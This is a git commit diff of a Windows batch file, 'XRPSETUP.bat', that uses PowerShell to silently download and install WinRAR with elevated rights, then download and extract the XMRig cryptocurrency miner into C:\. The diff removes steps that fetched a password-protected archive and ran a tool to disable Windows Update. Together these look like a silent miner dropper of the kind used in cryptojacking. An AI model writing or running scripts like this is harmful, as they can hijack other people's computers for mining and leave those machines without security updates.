3dbd5c7fdd366f44c44310ac0ae50f14f6d0871d
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2025-01-06 08:35:04 +0700

    XRPSETUP.bat

--- XRPSETUP.bat
+++ XRPSETUP.bat
@@ -1,10 +1,6 @@
 @echo off
 powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe' -OutFile 'C:\winrar-x64-701.exe'"
 powershell -NoProfile -Command "Start-Process -FilePath 'C:\winrar-x64-701.exe' -ArgumentList '/S' -Verb RunAs"
-powershell -NoProfile -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/main/Disable-update-windows.rar -OutFile C:\Disable-update-windows.rar"
-powershell -NoProfile -Command "& 'C:\Program Files\WinRAR\WinRAR.exe' x -pPITVN -ibck -y 'C:\Disable-update-windows.rar' 'C:\'"
-powershell -NoProfile -Command "Start-Sleep -Seconds 2"
-powershell -NoProfile -Command "& 'C:\Disable-update-windows\Wub_x64.exe'"
 powershell -NoProfile -Command "Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip -OutFile C:\xmrig-6.22.2-gcc-win64.zip"
 powershell -NoProfile -Command "& 'C:\Program Files\WinRAR\WinRAR.exe' x -ibck -y 'C:\xmrig-6.22.2-gcc-win64.zip' 'C:\'"
 powershell -NoProfile -Command "Start-Sleep -Seconds 3"
